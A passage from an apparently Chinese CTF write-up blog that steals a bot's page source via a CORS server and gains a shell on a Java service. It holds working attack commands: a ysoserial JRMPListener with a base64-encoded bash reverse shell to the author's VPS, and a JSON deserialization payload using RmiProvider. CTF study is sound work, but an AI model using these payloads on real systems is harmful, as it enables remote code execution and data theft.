</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CORSRequestHandler</span> (SimpleHTTPRequestHandler):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">end_headers</span> (self):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#39;Access-Control-Allow-Origin&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>)
</span></span><span style="display:flex;"><span>        SimpleHTTPRequestHandler<span style="color:#f92672">.</span>end_headers(self)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    test(CORSRequestHandler, HTTPServer)
</span></span></code></pre></div><p>然后发送</p>
<pre tabindex="0"><code>http://treasure.npointer.cn./index.html#http://39.105.176.37:8000/bot
</code></pre><p>nc接受到了源代码.</p>
<p>(分析过程以后补上)</p>
<p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p>vps上面执行</p>
<pre tabindex="0"><code>java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections5 &#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDUuMTc2LjM3Lzk5OTkgMD4mMQo=}|{base64,-d}|{bash,-i}&#39;
</code></pre><p>通过submit发送</p>
<pre tabindex="0"><code>{&#34;@\u0074ype&#34;:&#34;org.apache.commons.proxy.provider.remoting.RmiProvider&#34;,&#34;host&#34;:&#34;39.105.176.37&#34;,port:&#34;1088&#34;,&#34;name&#34;:&#34;Object&#34;}
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="http://ch3n9w.cpolar.cn/posts/gossip-note-before-back/">
    <span class="title">« Prev</span>
    <br>
    <span>临行前夜--2019</span>
  </a>
  <a class="next" href="http://ch3n9w.cpolar.cn/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/">
    <span class="title">Next »</span>
    <br>
    <span>LD_PRELOAD劫持类型题目</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="http://ch3n9w.cpolar.cn/">ch3n9w の 超元域</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
